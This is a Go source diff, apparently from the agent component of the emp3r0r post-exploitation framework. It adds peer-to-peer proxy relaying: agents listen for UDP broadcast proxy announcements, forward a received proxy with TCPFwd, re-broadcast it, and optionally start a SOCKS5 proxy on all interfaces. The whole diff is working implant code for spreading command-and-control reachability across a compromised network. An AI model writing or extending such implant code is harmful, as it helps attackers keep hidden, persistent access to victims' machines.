@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"strings"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
@@ -44,6 +45,21 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 		if tun.IsProxyOK(decMsg) {
 			AgentProxy = decMsg
 			log.Printf("BroadcastServer: %s set as AgentProxy\n", AgentProxy)
+
+			// pass the proxy to others
+			log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", AgentProxy)
+			sl := strings.Split(AgentProxy, "//")
+			if len(sl) < 2 {
+				log.Printf("TCPFwd: invalid proxy addr: %s", AgentProxy)
+				continue
+			}
+			go func() {
+				err = TCPFwd(sl[1], ProxyPort, ctx, cancel)
+				if err != nil {
+					log.Print("TCPFwd: ", err)
+				}
+			}()
+			go StartBroadcast(false, ctx, cancel)
 		}
 	}
 	return
@@ -51,7 +67,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error)
 
 // BroadcastMsg send a broadcast message on a network
 func BroadcastMsg(msg, dst string) (err error) {
-	pc, err := net.ListenPacket("udp4", ":"+BroadcastPort)
+	pc, err := net.ListenPacket("udp4", ":8887")
 	if err != nil {
 		return
 	}
@@ -73,24 +89,30 @@ func BroadcastMsg(msg, dst string) (err error) {
 	return
 }
 
-func StartBroadcast(ctx context.Context, cancel context.CancelFunc) {
-	// start a socks5 proxy
-	Socks5Proxy("on", "0.0.0.0:8388")
-	defer Socks5Proxy("off", "0.0.0.0:8388")
+func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
+	if start_socks5 {
+		// start a socks5 proxy
+		Socks5Proxy("on", "0.0.0.0:"+ProxyPort)
+		defer Socks5Proxy("off", "0.0.0.0:"+ProxyPort)
+	}
 
-	defer cancel()
+	defer func() {
+		log.Print("Broadcasting stopped")
+		cancel()
+	}()
 	proxyMsg := "socks5://127.0.0.1:1080"
 	for ctx.Err() == nil {
+		log.Print("Broadcasting our proxy...")
 		time.Sleep(time.Duration(RandInt(10, 120)) * time.Second)
 		ips := tun.IPaddr()
 		for _, ip := range ips {
 			if ip.Broadcast == nil {
 				continue
 			}
-			proxyMsg = fmt.Sprintf("socks5://%s:8388", ip.IP.String())
+			proxyMsg = fmt.Sprintf("socks5://%s:%s", ip.IP.String(), ProxyPort)
 			err := BroadcastMsg(proxyMsg, ip.Broadcast.String())
 			if err != nil {
-				log.Print(err)
+				log.Printf("BroadcastMsg failed: %v", err)
 			}
 		}
 	}
